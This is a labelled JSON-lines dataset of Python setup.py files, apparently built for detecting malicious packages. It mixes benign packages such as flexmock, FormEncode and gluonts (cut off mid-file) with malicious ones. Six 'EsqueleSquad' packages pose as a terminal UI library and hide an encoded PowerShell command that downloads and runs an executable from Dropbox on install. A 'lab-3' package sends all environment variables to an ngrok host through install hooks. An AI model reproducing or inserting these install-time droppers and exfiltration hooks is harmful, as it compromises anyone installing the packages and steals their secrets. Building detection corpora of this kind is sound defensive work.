{"idx": "py-strkillcraft-9.95", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-strkillcraft',\n    packages = ['modlib'],\n    version = '1.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "mcvisa-4.75", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'mcvisa',\n    packages = ['modlib'],\n    version = '2.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tprandstudyget-3.16", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprandstudyget',\n    packages = ['modlib'],\n    version = '1.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pongreplace-9.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pongreplace',\n    packages = ['modlib'],\n    version = '10.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libramguipull-5.13", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libramguipull',\n    packages = ['modlib'],\n    version = '8.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flexmock-0.11.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['flexmock']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'flexmock',\n    'version': '0.11.3',\n    'description': 'flexmock is a testing library for Python that makes it easy to create mocks, stubs and fakes.',\n    'long_description': '<p align=\"center\">\\n  <img alt=\"banner\" src=\"https://user-images.githubusercontent.com/25169984/138661460-969caf9e-8e88-4609-87c4-1a0ab9624ee4.png\">\\n</p>\\n\\n<p align=\"center\"><strong>flexmock</strong> <em>- Mock, stub, and spy library for Python.</em></p>\\n\\n<p align=\"center\">\\n<a href=\"https://pypi.org/project/flexmock/\">\\n  <img src=\"https://img.shields.io/pypi/v/flexmock\" alt=\"pypi\">\\n</a>\\n<a href=\"https://github.com/flexmock/flexmock/actions/workflows/ci.yml\">\\n  <img src=\"https://github.com/flexmock/flexmock/actions/workflows/ci.yml/badge.svg\" alt=\"ci\">\\n</a>\\n<a href=\"https://flexmock.readthedocs.io/\">\\n  <img src=\"https://img.shields.io/readthedocs/flexmock\" alt=\"documentation\">\\n</a>\\n<a href=\"https://codecov.io/gh/flexmock/flexmock\">\\n  <img src=\"https://codecov.io/gh/flexmock/flexmock/branch/master/graph/badge.svg?token=wRgtiGxhiL\" alt=\"codecov\">\\n</a>\\n<a href=\"./LICENSE\">\\n  <img src=\"https://img.shields.io/pypi/l/flexmock\" alt=\"license\">\\n</a>\\n</p>\\n\\n---\\n\\nFlexmock is a testing library for Python that makes it easy to create mocks, stubs, and fakes.\\n\\n## Features\\n\\n- **Mock**: Easily create mock objects and make assertions about which methods or attributes were used and arguments they were called with.\\n- **Spy**: Proxy calls to object\\'s original methods or attributes and make assertions based on return values or call count.\\n- **Fake**: Generate a fake objects to be used in your tests with ease.\\n- **Stub**: Create stub objects which replace parts of existing objects and classes with just one call.\\n- **No external dependencies**: Flexmock is lightweight and only uses Python standard library. There are no external dependencies.\\n- **Simple and intuitive**: Declarations are structured to read more like English sentences than API calls, so they are easy to learn and use.\\n- **Fully type annotated**: External API is fully type annotated so it works great with static analysis tools and editor auto-completion.\\n- **Integrations with test runners**: Integrates seamlessly with all major test runners like unittest, doctest, and pytest.\\n- **Python 3.6+ and PyPy3**: Extensively tested to work with latest Python versions.\\n\\n## Installation\\n\\nInstall with pip:\\n\\n```\\npip install flexmock\\n```\\n\\n## Examples\\n\\nFlexmock features smooth integration with pretty much every popular test runner, so no special setup is necessary. Simply importing flexmock into your test module is sufficient to get started with any of the following examples:\\n\\n```python\\nfrom flexmock import flexmock\\n```\\n\\n### Mocks\\n\\nAssertions take many flavors and flexmock has many different facilities to generate them:\\n\\n```python\\n# Simplest is ensuring that a certain method is called\\nflexmock(Train).should_receive(\"get_tickets\").once()\\n\\n# Of course, it is also possible to provide a default return value\\nflexmock(Train).should_receive(\"get_destination\").and_return(\"Paris\").once()\\n\\n# Or check that a method is called with specific arguments\\nflexmock(Train).should_receive(\"set_destination\").with_args(\"Seoul\").at_least().twice()\\n```\\n\\n### Spies\\n\\nInstead of mocking, there are also times when you want to execute the actual method and simply find out how many times it was called. Flexmock uses `should_call` to generate this sort of assertions instead of `should_receive`:\\n\\n```python\\n# Verify that a method is called at most three times\\nflexmock(Train).should_call(\"get_tickets\").at_most().times(3)\\n\\n# Make sure that a method is never called with specific arguments\\nflexmock(Train).should_call(\"set_destination\").with_args(\"Helsinki\").never()\\n\\n# More complex example with features like argument type and exception matching\\nflexmock(Train).should_call(\"crash\").with_args(str, int).and_raise(AttributeError).once()\\n```\\n\\nSee more examples in the documentation.\\n\\n## Documentation\\n\\nUser guide, examples, and a full API reference is available at: https://flexmock.readthedocs.io\\n\\n## Contributing\\n\\nContributions are absolutely welcome and encouraged! See [CONTRIBUTING.md](https://github.com/flexmock/flexmock/blob/master/CONTRIBUTING.md) to get started.\\n',\n    'author': 'Slavek Kabrda',\n    'author_email': None,\n    'maintainer': 'Adarsh Krishnan',\n    'maintainer_email': 'adarshk7@gmail.com',\n    'url': 'https://github.com/flexmock/flexmock',\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.6.2,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "lab-3-package-438d82fc-0.1.2", "func": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport socket\n\ndef notmalfunc():\n    # Extract environment variables\n    data = dict(os.environ)\n    data_str = \"\\n\".join([f\"{k}: {v}\" for k, v in data.items()])\n    \n    # Connect to ngrok-exposed Netcat listener\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('2.tcp.eu.ngrok.io', 19382))  # Replace with the correct ngrok address and port\n        sock.sendall(data_str.encode())\n        sock.close()\n    except Exception as e:\n        print(f\"Error connecting to the server: {e}\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"lab-3-package-438d82fc\",\n    version = \"0.1.2\",  # Increment the version number\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n", "target": 1}
{"idx": "FormEncode-2.0.1", "func": "\"\"\"FormEncode validates and converts nested structures.\n\nIt allows for a declarative form of defining the validation,\nand decoupled processes for filling and generating forms.\n\nThe official repo is at GitHub: https://github.com/formencode/formencode\n\"\"\"\nfrom __future__ import absolute_import\n\nimport sys\nfrom setuptools import setup, find_packages\nimport platform\n\nif not (2,7) <= sys.version_info[:2] < (3,0) and not (3,6) <= sys.version_info[:2]:\n    raise ImportError('Python version not supported')\n\ntests_require = [\n    'pytest<4.7' if sys.version_info[:2] < (3,0) else 'pytest',\n    'dnspython==1.16.0' if sys.version_info[:2] < (3,0) else 'dnspython>=2.0.0',\n    'pycountry<19' if sys.version_info < (3,0) else 'pycountry']\n\nsetup_requires = [\n    'setuptools_scm<6.0' if sys.version_info[:2] < (3,0) else 'setuptools_scm',\n    'setuptools_scm_git_archive',\n]\n\ndoctests = ['docs/htmlfill.txt', 'docs/Validator.txt',\n    'formencode/tests/non_empty.txt']\n\nsetup(name='FormEncode',\n      # requires_python='>=2.7,!=3.0,!=3.1,!=3.2,!=3.3,!=3.4,!=3.5' # PEP345\n      description=\"HTML form validation, generation, and conversion package\",\n      long_description=__doc__,\n      classifiers=[\n          \"Development Status :: 4 - Beta\",\n           \"Intended Audience :: Developers\",\n           \"License :: OSI Approved :: MIT License\",\n           \"Programming Language :: Python\",\n           \"Programming Language :: Python :: 2\",\n           \"Programming Language :: Python :: 2.7\",\n           \"Programming Language :: Python :: 3\",\n           \"Programming Language :: Python :: 3.6\",\n           \"Programming Language :: Python :: 3.7\",\n           \"Programming Language :: Python :: 3.8\",\n           \"Programming Language :: Python :: 3.9\",\n           \"Topic :: Software Development :: Libraries :: Python Modules\",\n           ],\n      author='Ian Bicking',\n      author_email='ianb@colorstudy.com',\n      url='http://formencode.org',\n      license='MIT',\n      data_files = [(\"\", [\"LICENSE.txt\"])],\n      zip_safe=False,\n      packages=find_packages(),\n      include_package_data=True,\n      package_data={'formencode': ['../docs/*.txt']},\n      test_suite='formencode.tests',\n      install_requires=['six'],\n      tests_require=tests_require,\n      use_scm_version=True,\n      setup_requires=setup_requires,\n\n      extras_require={'testing': tests_require},\n    )\n", "target": 0}
{"idx": "dagster-databricks-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_databricks/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-databricks\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"Package for Databricks-specific Dagster framework solid and resource components.\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-databricks\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_databricks_tests*\"]),\n        include_package_data=True,\n        install_requires=[\n            \"dagster==1.0.3\",\n            \"dagster-pyspark==0.16.3\",\n            \"databricks_api\",\n        ],\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "delayed_assert-0.3.6", "func": "import os\nimport io\nfrom setuptools import setup\n\n\nsetup(\n    name='delayed_assert',\n    version='0.3.6',\n    description='Delayed/soft assertions for python',\n    long_description=io.open(os.path.join(os.path.dirname('__file__'), 'README.md'), encoding='utf-8').read(),\n    long_description_content_type='text/markdown',\n    author='pr4bh4sh',\n    url='https://github.com/pr4bh4sh/python-delayed-assert',\n    packages=['delayed_assert'],\n)\n", "target": 0}
{"idx": "selfpywrandom-10.67", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpywrandom',\n    packages = ['modlib'],\n    version = '10.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gluonts-0.10.4", "func": "# Standard library imports\nimport distutils.cmd\nimport distutils.log\nimport itertools\nimport logging\nimport os\nimport subprocess\nimport sys\nfrom pathlib import Path\nfrom textwrap import dedent\n\n# Third-party imports\nfrom setuptools import find_namespace_packages, setup\n\nROOT = Path(__file__).parent\nSRC = ROOT / \"src\"\n\n\nGPU_SUPPORT = 0 == int(\n    subprocess.call(\n        \"nvidia-smi\",\n        shell=True,\n        stdout=open(os.devnull, \"w\"),\n        stderr=open(os.devnull, \"w\"),\n    )\n)\n\ntry:\n    from sphinx import apidoc, setup_command\n\n    HAS_SPHINX = True\nexcept ImportError:\n    logging.warning(\n        \"Package 'sphinx' not found. You will not be able to build the docs.\"\n    )\n\n    HAS_SPHINX = False\n\n\ndef read(*names, encoding=\"utf8\"):\n    with (ROOT / Path(*names)).open(encoding=encoding) as fp:\n        return fp.read()\n\n\ndef find_requirements(filename):\n    with (ROOT / \"requirements\" / filename).open() as f:\n        mxnet_old = \"mxnet\"\n        mxnet_new = \"mxnet-cu92mkl\" if GPU_SUPPORT else mxnet_old\n        return [\n            line.rstrip().replace(mxnet_old, mxnet_new, 1)\n            for line in f\n            if not (line.startswith(\"#\") or line.startswith(\"http\"))\n        ]\n\n\ndef get_version_and_cmdclass(version_file):\n    with open(version_file) as fobj:\n        code = fobj.read()\n\n    globals_ = {\"__file__\": str(version_file)}\n    exec(code, globals_)\n\n    return globals_[\"__version__\"], globals_[\"cmdclass\"]()\n\n\nversion, version_cmdclass = get_version_and_cmdclass(\"src/gluonts/_version.py\")\n\n\nclass TypeCheckCommand(distutils.cmd.Command):\n    \"\"\"A custom command to run MyPy on the project sources.\"\"\"\n\n    description = \"run MyPy on Python source files\"\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        # import here (after the setup_requires list is loaded),\n        # otherwise a module-not-found error is thrown\n        import mypy.api\n\n        mypy_opts = [\n            \"--allow-redefinition\",\n            \"--follow-imports=silent\",\n            \"--ignore-missing-imports\",\n        ]\n\n        folders = [str(p.parent.resolve()) for p in SRC.glob(\"**/.typesafe\")]\n\n        print(\n            \"The following folders contain a `.typesafe` marker file \"\n            \"and will be type-checked with `mypy`:\"\n        )\n        for folder in folders:\n            print(f\"  {folder}\")\n\n        std_out, std_err, exit_code = mypy.api.run(mypy_opts + folders)\n\n        print(std_out, file=sys.stdout)\n        print(std_err, file=sys.stderr)\n\n        if exit_code:\n            error_msg = dedent(\n                f\"\"\"\n                Mypy command\n\n                    mypy {\" \".join(mypy_opts + folders)}\n\n                returned a non-zero exit code. Fix the type errors listed above\n                and then run\n\n                    python setup.py type_check\n\n                in order to validate your fixes.\n                \"\"\"\n            ).lstrip()\n\n            print(error_msg, file=sys.stderr)\n            sys.exit(exit_code)\n\n\nclass StyleCheckCommand(distutils.cmd.Command):\n    \"\"\"A custom command to run MyPy on the project sources.\"\"\"\n\n    description = \"run Black style check on Python source files\"\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        \"\"\"Run command.\"\"\"\n\n        # import here (after the setup_requires list is loaded),\n        # otherwise a module-not-found error is thrown\n        import click\n        import black\n\n        black_opts = []\n        black_args = [\n            str(ROOT / folder)\n            for folder in [\"src\", \"test\", \"examples\"]\n            if (ROOT / folder).is_dir()\n        ]\n\n        print(\n            \"Python files in the following folders will be style-checked \"\n            \"with `black`:\"\n        )\n        print(\"\\n\".join([\"  \" + arg for arg in black_args]))\n\n        # a more direct way to call black\n        # this bypasses the problematic `_verify_python3_env` call in\n        # `click.BaseCommand.main`, which brakes things on Brazil builds\n        ctx = black.main.make_context(\n            info_name=\"black\", args=[\"--check\"] + black_opts + black_args\n        )\n        try:\n            exit_code = black.main.invoke(ctx)\n        except SystemExit as e:\n            exit_code = e.code\n        except click.exceptions.Exit as e:\n            exit_code = e.exit_code\n\n        if exit_code:\n            error_msg = dedent(\n                f\"\"\"\n                Black command\n\n                    black {\" \".join(['--check'] + black_opts + black_args)}\n\n                returned a non-zero exit code. Fix the files listed above with\n\n                    black {\" \".join(black_opts + black_args)}\n\n                and then run\n\n                    python setup.py style_check\n\n                in order to validate your fixes.\n                \"\"\"\n            ).lstrip()\n\n            print(error_msg, file=sys.stderr)\n            sys.exit(exit_code)\n\n\narrow_require = find_requirements(\"requirements-arrow.txt\")\ndocs_require = find_requirements(\"requirements-docs.txt\")\ntests_require = find_requirements(\"requirements-test.txt\")\nsagemaker_api_require = find_requirements(\n    \"requirements-extras-sagemaker-sdk.txt\"\n)\nshell_require = find_requirements(\"requirements-extras-shell.txt\")\nmxnet_require = find_requirements(\"requirements-mxnet.txt\")\ntorch_require = find_requirements(\"requirements-pytorch.txt\")\n\nsetup_requires = find_requirements(\"requirements-setup.txt\")\n\ndev_require = (\n    arrow_require\n    + docs_require\n    + tests_require\n    + shell_require\n    + setup_requires\n    + sagemaker_api_require\n)\n\nsetup_kwargs: dict = dict(\n    name=\"gluonts\",\n    version=version,\n    description=(\n        \"GluonTS is a Python toolkit for probabilistic time series modeling, \"\n        \"built around MXNet.\"\n    ),\n    long_description=read(\"README.md\"),\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/awslabs/gluon-ts\",\n    author=\"Amazon\",\n    author_email=\"gluon-ts-dev@amazon.com\",\n    maintainer_email=\"gluon-ts-dev@amazon.com\",\n    license=\"Apache License 2.0\",\n    python_requires=\">= 3.6\",\n    package_dir={\"\": \"src\"},\n    packages=find_namespace_packages(include=[\"gluonts*\"], where=str(SRC)),\n    include_package_data=True,\n    setup_requires=setup_requires,\n    install_requires=find_requirements(\"requirements.txt\"),\n    tests_require=tests_require,\n    extras_require={\n        \"arrow\": arrow_require,\n        \"dev\": dev_require,\n        \"docs\": docs_require,\n        \"mxnet\": mxnet_require,\n        \"R\": find_requirements(\"requirements-extras-r.txt\"),\n        \"Prophet\": find_requirements(\"requirements-extras-prophet.txt\"),\n        \"pro\": arrow_require + [\"orjson\"],\n        \"shell\": shell_require,\n        \"torch\": torch_require,\n    },\n    entry_points=dict(\n        gluonts_forecasters=[\n            \"deepar=gluonts.model.deepar:DeepAREstimator\",\n            \"DeepAR=gluonts.model.deepar:DeepAREstimator\",\n            \"DeepFactor=gluonts.model.deep_factor:DeepFactorEstimator\",\n            \"DeepState=gluonts.model.deepstate:DeepStateEstimator\",\n            \"DeepVAR=gluonts.model.deepvar:DeepVAREstimator\",\n            \"GaussianProcess=gluonts.model.gp_forecaster:GaussianProcessEstimator\",\n            \"GPVAR=gluonts.model.gpvar:GPVAREstimator\",\n            \"LSTNet=gluonts.model.lstnet:LSTNetEstimator\",\n            \"NBEATS=gluonts.model.n_beats:NBEATSEstimator\",\n            \"NBEATSEnsemble=gluonts.model.n_beats:NBEATSEnsembleEstimator\",\n            \"NPTS=gluonts.model.npts:NPTSPredictor\",\n            \"Rotbaum=gluonts.model.rotbaum:TreeEstimator\",\n            \"SelfAttention=gluonts.model.san:SelfAttentionEstimator\",\n            \"SeasonalNaive=gluonts.model.seasonal_naive:SeasonalNaivePredictor\",\n            \"MQCNN=gluonts.model.seq2seq:MQCNNEstimator\",\n            \"MQRNN=gluonts.model.seq2seq:MQRNNEstimator\",\n            \"Seq2Seq=gluonts.model.seq2seq:Seq2SeqEstimator\",\n            \"SimpleFeedForward=gluonts.model.simple_feedforward:SimpleFeedForwardEstimator\",\n            \"TFT=gluonts.model.tft:TemporalFusionTransformerEstimator\",\n            \"DeepTPP=gluonts.model.tpp:DeepTPPEstimator\",\n            \"Transformer=gluonts.model.transformer:TransformerEstimator\",\n            \"Constant=gluonts.model.trivial.constant:ConstantPredictor\",\n            \"ConstantValue=gluonts.model.trivial.constant:ConstantValuePredictor\",\n            \"Identity=gluonts.model.trivial.identity:IdentityPredictor\",\n            \"Mean=gluonts.model.trivial.mean:MeanEstimator\",\n            \"MeanPredictor=gluonts.model.trivial.mean:MeanPredictor\",\n            \"MovingAverage=gluonts.model.trivial.mean:MovingAveragePredictor\",\n            \"WaveNet=gluonts.model.wavenet:WaveNetEstimator\",\n            # \"r=gluonts.model.r_forecast:RForecastPredictor [R]\",\n            # \"prophet=gluonts.model.prophet:ProphetPredictor [Prophet]\",\n        ]\n    ),\n    cmdclass={\n        \"type_check\": TypeCheckCommand,\n        \"style_check\": StyleCheckCommand,\n        **version_cmdclass,\n    },\n)\n\nif HAS_SPHINX:\n\n    class 